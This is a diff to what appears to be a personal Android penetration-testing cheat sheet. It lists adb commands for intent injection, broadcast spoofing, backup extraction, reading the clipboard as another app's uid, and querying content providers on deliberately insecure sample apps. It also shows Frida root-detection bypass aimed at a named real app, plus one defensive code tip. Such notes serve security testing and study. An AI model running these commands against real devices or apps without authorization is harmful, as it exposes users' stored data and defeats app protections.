@@ -1,3 +1,8 @@
+adb devices
+adb -s device-id shell
+
+sqllite3 filename
+
 adb shell am start -n com.example.intentinjection/.Dashboard -e username 'hacker'
 adb shell am broadcast -p com.example.insecurebroadcastreceiver -a theBroadcast -e mobile '000' -e password "123456"
 
@@ -116,3 +121,32 @@ frida --codeshare dzonerzy/fridantiroot -f com.sadadpsp.eva -U
 %resume
 
 frida -l file.js -f com.sadadpsp.eva -U
+
+
+
+
+allow backup:
+
+adb backup -apk -shared package_name 
+
+https://github.com/nelenkov/android-backup-extractor
+
+
+clipboard sensitive : 
+ls -l /data/data | grep package_name # get uid  
+su uid 
+service call clipboard 2 s16 package_name
+
+disable copy/paste sensitive edit text
+
+EditTextUsername.setLongClickable(false);
+
+longClickable="false"
+
+
+
+
+
+
+adb shell
+content query --uri content://com.example.insecurecontentprovider2.Notesprovider/notes
